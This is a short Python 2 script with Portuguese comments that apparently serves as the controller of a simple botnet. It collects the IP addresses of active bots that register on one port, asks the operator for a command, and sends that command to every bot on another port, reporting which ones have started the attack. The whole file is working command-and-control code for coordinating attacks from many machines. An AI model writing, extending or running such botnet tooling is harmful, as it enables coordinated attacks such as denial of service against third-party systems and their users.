from socket import *

serverNameList = []
serverPort = 11750
serverPortSubscription = 11749

#recebendo ips de bots ativos nas maquinas
print "Recebendo ips dos bots ativos..."
serverSocket = socket(AF_INET,SOCK_STREAM)
serverSocket.bind(('',serverPortSubscription))
serverSocket.listen(15)
serverSocket.settimeout(10)
firstTimeout = False
while (firstTimeout == False):
    try:
        connectionSocket, addr = serverSocket.accept()
        subscriptionConfirmation = connectionSocket.recv(1024)
        serverNameList.append(addr[0])
        print str(addr[0]) + " foi inscrito na lista"
    except error, exc:
        print "Lista de ips dos bots ativos obtida:"
        print serverNameList
        firstTimeout = True
        serverSocket.close()

if len(serverNameList) > 0:
    #envia um comando para todos os bots na lista de ips obtidos
    command = raw_input('Insira o comando para envio ao bots:')
    for serverName in serverNameList:
        try:
            clientSocket = socket(AF_INET, SOCK_STREAM)
            clientSocket.settimeout(8)
            clientSocket.connect((serverName,serverPort))
            clientSocket.send(command)
            modifiedSentence = clientSocket.recv(1024)
            if modifiedSentence == "Confirmed":
                print 'Ataque iniciado por ' + serverName
            else:
                print "Comando invalido"
            clientSocket.close()
        except error, exc:
            print "Nao foi possivel conectar com " + serverName
else:
    print "Nenhum bot ativo na rede"
